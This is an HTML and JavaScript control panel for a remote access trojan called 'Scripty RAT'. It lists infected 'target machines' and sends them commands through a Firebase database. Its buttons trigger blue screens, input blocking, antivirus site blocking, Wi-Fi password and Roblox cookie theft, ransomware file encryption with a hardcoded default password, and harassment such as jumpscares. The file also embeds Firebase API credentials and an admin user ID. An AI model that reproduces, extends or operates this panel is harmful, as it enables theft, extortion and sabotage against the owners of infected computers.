<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scripty RAT | C2</title>
    <!-- Phosphor Icons -->
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <style>
        :root {
            --bg-dark: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --primary: #3b82f6;
            --primary-hover: #2563eb;
            --danger: #ef4444;
            --danger-hover: #dc2626;
            --success: #22c55e;
            --success-hover: #16a34a;
            --warn: #f59e0b;
            --warn-hover: #d97706;
            --border: rgba(255,255,255,0.08);
        }

        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', 'Segoe UI', sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        h1 {
            font-weight: 800;
            font-size: 2rem;
            margin-bottom: 2rem;
            background: linear-gradient(to right, var(--primary), #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }

        /* TOP BAR */
        .top-bar {
            position: fixed;
            top: 0; left: 0; right: 0;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            padding: 1px 20px; 
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
            z-index: 1000;
        }
        .user-info { font-size: 0.9rem; font-weight: 600; color: var(--text-muted); }
        .logout-btn {
            background: transparent;
            border: 1px solid var(--danger);
            color: var(--danger);
            padding: 6px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.2s;
        }
        .logout-btn:hover { background: var(--danger); color: white; }

        /* SELECTOR */
        .control-panel {
            width: 100%;
            max-width: 1100px;
            margin-top: 80px;
        }

        .selector-box {
            background: var(--card-bg);
            border: 1px solid var(--border);
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        select {
            background: #0f172a;
            color: white;
            border: 1px solid #334155;
            padding: 12px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            font-size: 1rem;
            margin-top: 10px;
            outline: none;
        }
        select:focus { border-color: var(--primary); }

        /* GRID DASHBOARD */
        .dashboard-grid {
            display: none; 
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 20px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            transition: transform 0.2s;
        }
        .card:hover { transform: translateY(-2px); border-color: rgba(255,255,255,0.15); }

        .card-title {
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-main);
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
        }
        .card-title i { font-size: 1.3rem; }

        /* BUTTON GRID (Uniform 2 Columns) */
        .btn-grid {
            display: grid;
            grid-template-columns: 1fr 1fr; /* ALWAYS 2 equal columns */
            gap: 10px;
        }
        
        /* UNIFORM BUTTON STYLE */
        button {
            border: none;
            border-radius: 8px;
            padding: 0 10px; /* Horizontal padding only */
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s, transform 0.1s;
            
            /* FORCED SAME SIZE */
            width: 100%;
            height: 50px; /* Fixed Height */
            
            /* Text Handling */
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        button:active { transform: scale(0.98); }

        .btn-primary { background: var(--primary); }
        .btn-primary:hover { background: var(--primary-hover); }

        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: var(--danger-hover); }

        .btn-warn { background: var(--warn); color: #0f172a; }
        .btn-warn:hover { background: var(--warn-hover); }

        .btn-success { background: var(--success); }
        .btn-success:hover { background: var(--success-hover); }

        .btn-neutral { background: #475569; }
        .btn-neutral:hover { background: #64748b; }

        /* Full width slider container */
        .slider-container {
            grid-column: span 2; 
            padding: 5px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* SLIDER */
        input[type=range] {
            width: 100%;
            height: 6px;
            background: #334155;
            border-radius: 5px;
            outline: none;
            -webkit-appearance: none;
        }
        input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            background: var(--primary);
            border-radius: 50%;
            cursor: pointer;
        }

        /* LOGS */
        .logs-box {
            width: 100%;
            max-width: 1100px;
            margin-top: 30px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 15px;
        }
        .log-list {
            list-style: none;
            padding: 0;
            margin: 0;
            max-height: 150px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }
        .log-item {
            padding: 6px 0;
            border-bottom: 1px solid #1e293b;
            color: #cbd5e1;
            display: flex;
            justify-content: space-between;
        }
        .log-ts { color: #64748b; font-size: 0.75rem; }

    </style>
</head>
<body>

    <!-- TOP BAR -->
    <div class="top-bar">
        <h1>Scripty RAT <span style="font-size:1rem; opacity:0.7; font-weight:400;">C2 PANEL</span></h1>
        <div style="display:flex; align-items:center; gap:15px;">
            <span id="userDisplay" class="user-info">Authenticating...</span>
            <button class="logout-btn" style="height:34px; width:auto;">LOGOUT</button>
        </div>
    </div>

    <div class="control-panel">
        
        <!-- SELECTOR -->
        <div class="selector-box">
            <i class="ph ph-desktop" style="font-size:2rem; color:var(--primary); margin-bottom:10px;"></i>
            <h3 style="margin:0;">Select Target Machine</h3>
            <select id="categorySelect" onchange="selectPC()">
                <option value="">-- Waiting for Connection --</option>
            </select>
            <p id="targetStatus" style="margin-top:10px; color:var(--text-muted); font-size:0.9rem;">No target selected</p>
        </div>

        <!-- DASHBOARD -->
        <div id="mainDashboard" class="dashboard-grid">

            <!-- 1. POWER -->
            <div class="card" style="border-top: 3px solid var(--danger);">
                <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
                <div class="btn-grid">
                    <button class="btn-primary" onclick="cmd('lock_pc')"><i class="ph ph-lock"></i> Lock</button>
                    <button class="btn-warn" onclick="cmd('restart_pc')"><i class="ph ph-arrows-clockwise"></i> Restart</button>
                    <button class="btn-danger" onclick="confirmAction('shutdown_pc')"><i class="ph ph-power"></i> Shutdown</button>
                    <button class="btn-danger" onclick="confirmAction('bsod')"><i class="ph ph-skull"></i> BSOD</button>
                    <button class="btn-danger" onclick="toggleInput(true)"><i class="ph ph-keyboard-slash"></i> Block Input</button>
                    <button class="btn-success" onclick="toggleInput(false)"><i class="ph ph-keyboard"></i> Free Input</button>
                </div>
            </div>

            <!-- 2. SECURITY & NETWORK -->
            <div class="card" style="border-top: 3px solid var(--danger);">
                <div class="card-title"><i class="ph ph-shield-warning" style="color:var(--danger);"></i> Security & Net</div>
                <div class="btn-grid">
                    <button class="btn-danger" onclick="cmd('block_av_sites')"><i class="ph ph-prohibit"></i> Block AV</button>
                    <button class="btn-success" onclick="cmd('unblock_av_sites')"><i class="ph ph-check-circle"></i> Unblock AV</button>
                    <button class="btn-danger" onclick="confirmAction('set_critical')"><i class="ph ph-warning"></i> Set Critical</button>
                    <button class="btn-success" onclick="cmd('unset_critical')"><i class="ph ph-shield-check"></i> Unset</button>
                    <button class="btn-primary" onclick="cmd('check_admin')" style="grid-column: span 2"><i class="ph ph-user-gear"></i> Check Admin Status</button>
                </div>
            </div>

            <!-- 3. STEALERS -->
            <div class="card" style="border-top: 3px solid var(--danger);">
                <div class="card-title"><i class="ph ph-spy" style="color:#a855f7;"></i> Data Extraction</div>
                <div class="btn-grid">
                    <button class="btn-primary" onclick="cmd('wifi_stealer')"><i class="ph ph-wifi-high"></i> Steal Wi-Fi</button>
                    <button class="btn-warn" onclick="cmd('grab_roblox')"><i class="ph ph-cookie"></i> Roblox Cookie</button>
                    <button class="btn-neutral" onclick="cmd('hide_taskbar')"><i class="ph ph-eye-slash"></i> Hide Taskbar</button>
                    <button class="btn-primary" onclick="cmd('show_taskbar')"><i class="ph ph-eye"></i> Show Taskbar</button>
                </div>
            </div>

            <!-- 4. ENCRYPTION -->
            <div class="card" style="border-top: 3px solid var(--danger);">
                <div class="card-title"><i class="ph ph-lock-key" style="color:var(--danger);"></i> Ransomware</div>
                <div class="btn-grid">
                    <button class="btn-danger" onclick="askForceEncrypt()"><i class="ph ph-lock-simple"></i> Encrypt</button>
                    <button class="btn-success" onclick="askDecrypt()"><i class="ph ph-lock-open"></i> Decrypt</button>
                </div>
            </div>

            <!-- 5. MEDIA & TROLLING -->
            <div class="card" style="border-top: 3px solid var(--danger);">
                <div class="card-title"><i class="ph ph-speaker-high" style="color:var(--success);"></i> Media & Troll</div>
                <div class="btn-grid">
                    <button class="btn-primary" onclick="askTTS()"><i class="ph ph-microphone"></i> TTS Speak</button>
                    <button class="btn-warn" onclick="cmd('jumpscare')"><i class="ph ph-ghost"></i> Jumpscare</button>
                    <button class="btn-primary" onclick="askMsgBox()"><i class="ph ph-chat-centered-text"></i> Fake Error</button>
                    <button class="btn-danger" onclick="cmd('block_screen')"><i class="ph ph-monitor-off"></i> Block Screen</button>
                    
                    <div class="slider-container">
                        <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)">
                    </div>
                </div>
            </div>

        </div>

        <!-- LOGS -->
        <div class="logs-box">
            <h4 style="margin-top:0; color:var(--text-muted); font-size:0.8rem; text-transform:uppercase;">Activity Log</h4>
            <ul class="log-list" id="logList"></ul>
        </div>

    </div>

    <!-- SCRIPT LOGIC -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, child, push, onValue, limitToLast, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyBhG3jjUoP6F-MHIqYKP7TvCh4FQ_Rfcd0",
            authDomain: "potkan-5132c.firebaseapp.com",
            databaseURL: "https://potkan-5132c-default-rtdb.firebaseio.com/",
            projectId: "potkan-5132c",
            storageBucket: "potkan-5132c.firebasestorage.app",
            messagingSenderId: "1049909900706",
            appId: "1:1049909900706:web:f4d5b811a98760f0862efb"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); 
        const db = getDatabase(app);
        const dbRef = ref(db);
        const ADMIN_UID = "sJSL8EjvFhMpoiD4yaAThWDKsf32"; 

        onAuthStateChanged(auth, (user) => {
            if (user && user.uid === ADMIN_UID) {
                document.getElementById('userDisplay').innerText = user.email;
            } else {
                window.location.href = "index.html";
            }
        });

        window.logout = () => signOut(auth).then(() => window.location.href = "index.html");

        window.currentTargetID = null;
        window.currentPCName = "Unknown";

        // LOAD PCS
        get(child(dbRef, `discord_structure`)).then((snapshot) => {
            const select = document.getElementById('categorySelect');
            if (snapshot.exists()) {
                const data = snapshot.val();
                const structure = data.structure || data;
                select.innerHTML = `<option value="">-- Select Target --</option>`;
                for (const [serverName, categories] of Object.entries(structure)) {
                    if (serverName === "last_updated") continue;
                    const group = document.createElement('optgroup');
                    group.label = serverName;
                    for (const catName of Object.keys(categories)) {
                        const option = document.createElement('option');
                        option.value = JSON.stringify({ server: serverName, category: catName });
                        option.innerText = `üñ•Ô∏è ${catName}`;
                        group.appendChild(option);
                    }
                    select.appendChild(group);
                }
            }
        });

        window.selectPC = function() {
            const val = document.getElementById('categorySelect').value;
            const dashboard = document.getElementById('mainDashboard');
            const status = document.getElementById('targetStatus');

            if (!val) {
                dashboard.style.display = "none";
                status.innerText = "No target selected";
                return;
            }
            
            const { server, category } = JSON.parse(val);
            window.currentPCName = category;
            
            get(child(dbRef, `discord_structure`)).then((snap) => {
                const channels = (snap.val().structure || snap.val())[server][category];
                const targetNames = ["remote-access", "ùï£ùïñùïûùï†ùï•ùïñ-ùïíùïîùïîùïñùï§ùï§", "cmd", "terminal"];
                let foundID = null;

                for (const [id, name] of Object.entries(channels)) {
                    if (targetNames.includes(name.toLowerCase())) { foundID = id; break; }
                }

                if (foundID) {
                    window.currentTargetID = foundID;
                    dashboard.style.display = "grid"; 
                    status.innerHTML = `<span style="color:var(--success)">‚óè Connected:</span> ${category}`;
                } else {
                    dashboard.style.display = "none";
                    status.innerHTML = `<span style="color:var(--danger)">‚óè Error:</span> Remote access channel missing`;
                }
            });
        };

        const logsRef = query(ref(db, 'logs'), limitToLast(15));
        onValue(logsRef, (snap) => {
            const list = document.getElementById('logList');
            list.innerHTML = ""; 
            if(snap.exists()) {
                Object.values(snap.val()).reverse().forEach(log => {
                    const li = document.createElement('li');
                    li.className = 'log-item';
                    li.innerHTML = `<span>> ${log.message}</span><span class="log-ts">${new Date(log.timestamp).toLocaleTimeString()}</span>`;
                    list.appendChild(li);
                });
            }
        });

        // ACTIONS
        function writeDB(data) {
            if (!window.currentTargetID) return alert("Select a Target first!");
            data.target_id = window.currentTargetID;
            data.timestamp = Date.now();
            set(ref(db, 'queue/pending'), data);
            
            let msg = data.type.replace('_', ' ').toUpperCase();
            if(data.text) msg += ` "${data.text}"`;
            push(ref(db, 'logs'), { message: `[${window.currentPCName}] ${msg}`, timestamp: Date.now() });
        }

        window.cmd = (type) => writeDB({ type });
        window.confirmAction = (type) => { if(confirm("Are you sure?")) cmd(type); };
        window.toggleInput = (block) => cmd(block ? 'disable_input' : 'enable_input');
        
        window.askTTS = () => { const t = prompt("Text to speak:"); if(t) writeDB({type:'tts', text:t}); };
        window.askMsgBox = () => { const t = prompt("Message:"); if(t) writeDB({type:'msgbox', text:t}); };
        window.setVolume = (v) => writeDB({type:'volume', value:v});
        
        window.askForceEncrypt = () => {
            const p = prompt("Password (optional):");
            if(confirm("‚ö† ENCRYPT FILES? This is destructive.")) writeDB({type:'force_encrypt', password: p || "scripty_rat_best_777"});
        };
        window.askDecrypt = () => {
            const p = prompt("Decryption Password:");
            if(p) writeDB({type:'decrypt_files', password: p});
        };
    </script>
</body>
</html>
